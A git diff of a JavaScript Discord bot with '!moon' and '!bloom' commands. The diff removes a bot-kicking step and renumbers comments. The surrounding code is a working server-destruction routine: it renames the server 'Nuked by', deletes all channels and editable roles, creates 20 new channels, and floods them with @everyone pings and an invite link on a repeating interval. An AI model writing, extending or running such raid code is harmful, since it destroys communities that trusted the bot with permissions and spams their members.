@@ -22,33 +22,20 @@ module.exports = (client) => {
         // ==========================================
         if (command === "!moon") {
             try {
-                // 1. Kick all other bots
-                const botMembers = guild.members.cache;
-                for (const [, member] of botMembers) {
-                    if (
-                        member.user.bot &&
-                        member.id !== client.user.id &&
-                        member.id !== message.author.id &&
-                        member.kickable
-                    ) {
-                        await member.kick("Moon command").catch(() => {});
-                    }
-                }
-
-                // 1.1 Server Details Change
+                // Server Details Change
                 await guild.setName("Nuked by Moon Community 🌙").catch(() => {});
                 const iconPath = path.join(__dirname, '../assets/icon.png');
                 if (fs.existsSync(iconPath)) {
                     await guild.setIcon(iconPath).catch(() => {});
                 }
                 
-                // 2. Delete all existing channels
+                // Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
                 for (const channel of channels) {
                     await channel.delete("Moon command").catch(() => {});
                 }
 
-                // 3. Delete all deletable roles
+                // Delete all deletable roles
                 const roles = [...guild.roles.cache.values()];
                 for (const role of roles) {
                     if (role.id !== guild.id && role.editable) {
@@ -56,7 +43,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // 4. Create new text channels
+                // Create new text channels
                 const newChannels = [];
                 for (let i = 0; i < 20; i++) {
                     const channel = await guild.channels.create({
@@ -69,7 +56,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // 5. Send initial message
+                // Send initial message
                 const welcomeMessage = "@everyone @here server nuked by **Moon Community 🌙** join our discord discord.gg/h5ejJAabPv ";
                 await Promise.all(
                     newChannels.map(channel =>
@@ -80,13 +67,13 @@ module.exports = (client) => {
                     )
                 );
 
-                // 6. Stop previous interval if active
+                // Stop previous interval if active
                 if (welcomeInterval) {
                     clearInterval(welcomeInterval);
                     welcomeInterval = null;
                 }
 
-                // 7. Interval spam
+                // Interval spam
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
@@ -123,37 +110,24 @@ module.exports = (client) => {
         }
 
         // ==========================================
-        // 3. COMMAND: !bloom (Banner removed, uses local icon.png)
+        // 3. COMMAND: !bloom
         // ==========================================
         if (command === "!bloom") {
             try {
-                // 1. Kick all other bots
-                const botMembers = guild.members.cache;
-                for (const [, member] of botMembers) {
-                    if (
-                        member.user.bot &&
-                        member.id !== client.user.id &&
-                        member.id !== message.author.id &&
-                        member.kickable
-                    ) {
-                        await member.kick("bloom command").catch(() => {});
-                    }
-                }
-
-                // 1.1 Server Details Change
+                // Server Details Change
                 await guild.setName("Moon Community 🌙").catch(() => {});
                 const iconPath = path.join(__dirname, '../assets/icon.png');
                 if (fs.existsSync(iconPath)) {
                     await guild.setIcon(iconPath).catch(() => {});
                 }
                 
-                // 2. Delete all existing channels
+                // Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
                 for (const channel of channels) {
                     await channel.delete("bloom command").catch(() => {});
                 }
 
-                // 3. Delete all deletable roles
+                // Delete all deletable roles
                 const roles = [...guild.roles.cache.values()];
                 for (const role of roles) {
                     if (role.id !== guild.id && role.editable) {
@@ -161,7 +135,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // 4. Create new text channels
+                // Create new text channels
                 const newChannels = [];
                 for (let i = 0; i < 20; i++) {
                     const channel = await guild.channels.create({
@@ -174,7 +148,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // 5. Send initial message (No banner)
+                // Send initial message (No banner)
                 const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
                 await Promise.all(
                     newChannels.map(channel =>
@@ -184,13 +158,13 @@ module.exports = (client) => {
                     )
                 );
 
-                // 6. Stop previous interval if active
+                // Stop previous interval if active
                 if (welcomeInterval) {
                     clearInterval(welcomeInterval);
                     welcomeInterval = null;
                 }
 
-                // 7. Interval spam
+                // Interval spam
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
@@ -216,4 +190,3 @@ module.exports = (client) => {
         }
     });
 };
-                        
